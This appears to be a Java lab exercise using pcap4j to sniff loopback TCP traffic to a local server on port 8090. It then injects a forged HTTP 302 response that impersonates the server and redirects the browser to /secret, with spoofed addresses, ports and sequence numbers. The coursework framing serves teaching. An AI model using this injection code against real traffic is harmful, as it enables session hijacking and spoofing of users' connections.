package org.example;

import org.pcap4j.core.*;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.*;
import org.pcap4j.packet.namednumber.*;

import java.net.Inet6Address;
import java.nio.charset.StandardCharsets;
import java.time.format.DateTimeFormatter;
import java.time.ZonedDateTime;
import java.time.ZoneId;

import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Parses Pcap file from simple server and later injects Packets into it
 */
public class PcapParser {
    /**
     * Main method to run this code
     * you will only be commenting out lines depending on the task you are performing
     * Refer to the lab spec to know what the tasks are
     *
     * @param args Command-line arguments
     */
    public static void main(String[] args) throws PcapNativeException, NotOpenException {
        PcapNetworkInterface device = getInterface();
        if (device == null) {
            System.err.println("No Interfaces found.");
            return;
        }

        listen(device);
    }

    /**
     * This method finds the network interface device to listen on
     *
     * We'll be listening on "Adapter for loopback traffic"
     * the amount of devices differs from time to time sometimes there's 10 sometimes there's 7
     * If you get an index error
     * then run the helper method provided below and change the index to the one that says
     * "NPF_loopback" on windows | will double check on mac and wsl later
     * and IP addresses of
     * "/0:0:0:0:0:0:0:1"
     * "/127.0.0.1"
     *
     * @return a {@link PcapNetworkInterface} interface
     */
    public static PcapNetworkInterface getInterface() throws PcapNativeException {
        List<PcapNetworkInterface> allDevs = Pcaps.findAllDevs();
        if (allDevs == null || allDevs.isEmpty()) return null;

        return allDevs.get(5);
    }

    /**
     * Helper method to find the correct {@link PcapNetworkInterface} device
     *
     * @param allDevs a list of {@link PcapNetworkInterface} devices
     */
    private static void getDevs(List<PcapNetworkInterface> allDevs) {
        for (int i = 0; i < allDevs.size(); i++) {
            PcapNetworkInterface device = allDevs.get(i);
            System.out.println(device.getName() + " at index: " + i);
            for (PcapAddress addr : device.getAddresses()) {
                System.out.println(addr.getAddress());
            }
        }
    }

    /**
     * Captures the TCP packets from simple server
     *
     * @param device a {@link PcapNetworkInterface} device
     */
    public static void listen(PcapNetworkInterface device) throws NotOpenException, PcapNativeException {
        // let's confirm we're listening to the correct device
        // It should say "NPF_Loopback" | will double-check for wsl and mac later
        System.out.println("Listening on device: " + device.getName());

        PromiscuousMode mode = PromiscuousMode.PROMISCUOUS;
        PcapHandle handle = device.openLive(65536, mode, 10);
        handle.setFilter("tcp port 8090", BpfCompileMode.OPTIMIZE);
        AtomicReference<IpV6Packet.IpV6FlowLabel> flowLabel = new AtomicReference<>();

        PacketListener listener = pcapPacket -> {
            Packet packet = pcapPacket.getPacket();

            try {
                if (packet instanceof BsdLoopbackPacket loopback) {

                    Packet payload = loopback.getPayload();
                    if (payload == null) return;

                    byte[] rawData = payload.getRawData();
                    if (rawData.length == 0) return;

                    IpV6Packet ipv6 = IpV6Packet.newPacket(rawData, 0, rawData.length);

                    if (ipv6.getPayload() instanceof TcpPacket tcp) {
                        // Remove this comment after you fill in "inject" method
                        // CHECK FOR THE TARGET REQUEST
                        if (tcp.getPayload() != null) {
                            String payloadData = new String(tcp.getPayload().getRawData());

                            // Get the flow label
                            if (payloadData.contains("HTTP/1.1 302 Found")) {
                                flowLabel.set(ipv6.getHeader().getFlowLabel());
                            }

                            // Only inject when the browser asks for the final page
                            if (payloadData.contains("GET /d HTTP/1.1")) {
                                inject(handle, flowLabel.get(), ipv6, tcp);
                            }
                        }

                        printTcp(tcp);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        };

        try {
            handle.loop(30, listener);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            handle.close();
        }
    }

    /**
     * Helper method that prints {@link TcpPacket} packet in clean format
     *
     * @param packet {@link TcpPacket} packet
     */
    private static void printTcp(TcpPacket packet) {
        System.out.println("TCP Packet Captured:");
        System.out.println("  Port: " + packet.getHeader().getDstPort());
        if (packet.getPayload() != null) {
            System.out.println("  Data: " + new String(packet.getPayload().getRawData()));
        }
        System.out.println("---------------------------------");
    }

    /**
     * Injects a TCP packet that redirects from final destination
     *
     * @param handle {@link PcapHandle} handle
     * @param originalIp The captured IPv6 packet (the request)
     * @param originalTcp The captured TCP packet (the request)
     */
    /**
     * Injects a TCP Response (HTTP 302) impersonating the server
     */
    public static void inject(PcapHandle handle, IpV6Packet.IpV6FlowLabel flowLabel, IpV6Packet originalIp, TcpPacket originalTcp) throws NotOpenException, PcapNativeException {
        String date = DateTimeFormatter.RFC_1123_DATE_TIME.format(ZonedDateTime.now(ZoneId.of("GMT")));

        String data = "HTTP/1.1 302 Found\r\n"
                + "Date: " + date + "\r\n"
                + "Location: /secret\r\n"
                + "Content-length: 0\r\n"
                + "Server: Jetty(11.0.24)\r\n"
                + "\r\n";

        byte[] http_payload = data.getBytes(StandardCharsets.UTF_8);
        UnknownPacket.Builder http_builder = new UnknownPacket.Builder();
        http_builder.rawData(http_payload);

        int len = 0;
        if (originalTcp.getPayload() != null) {
            len = originalTcp.getPayload().length();
        }

        TcpPacket.TcpHeader tcpHeader = originalTcp.getHeader();

        int prevSeqNum = tcpHeader.getSequenceNumber();
        int prevAckNum = tcpHeader.getAcknowledgmentNumber();
        TcpPort srcPort = tcpHeader.getSrcPort();
        TcpPort dstPort = tcpHeader.getDstPort();

        Inet6Address srcAddr = originalIp.getHeader().getSrcAddr();
        Inet6Address dstAddr = originalIp.getHeader().getDstAddr();

        TcpPacket.Builder tcpBuilder = new TcpPacket.Builder();
        tcpBuilder.acknowledgmentNumber(prevSeqNum + len)
                .sequenceNumber(prevAckNum)
                .dstPort(srcPort)
                .srcPort(dstPort)
                .ack(true)
                .psh(true)
                .rst(false)
                .syn(false)
                .fin(false)
                .window((short) 250)
                .payloadBuilder(http_builder)
                .dstAddr(srcAddr)
                .srcAddr(dstAddr)
                .correctChecksumAtBuild(true)
                .correctLengthAtBuild(true);

        IpV6Packet.Builder ipv6Builder = new IpV6Packet.Builder();
        ipv6Builder.version(IpVersion.IPV6)
                .srcAddr(dstAddr)
                .dstAddr(srcAddr)
                .correctLengthAtBuild(true)
                .flowLabel(flowLabel)
                .hopLimit((byte) 128)
                .trafficClass(IpV6SimpleTrafficClass.newInstance((byte) 0))
                .nextHeader(IpNumber.TCP)
                .payloadBuilder(tcpBuilder);

        BsdLoopbackPacket.Builder loopBackBuilder = new BsdLoopbackPacket.Builder();
        loopBackBuilder.protocolFamily(ProtocolFamily.PF_INET6)
                        .payloadBuilder(ipv6Builder);

        BsdLoopbackPacket packet = loopBackBuilder.build();
        handle.sendPacket(packet);
    }
}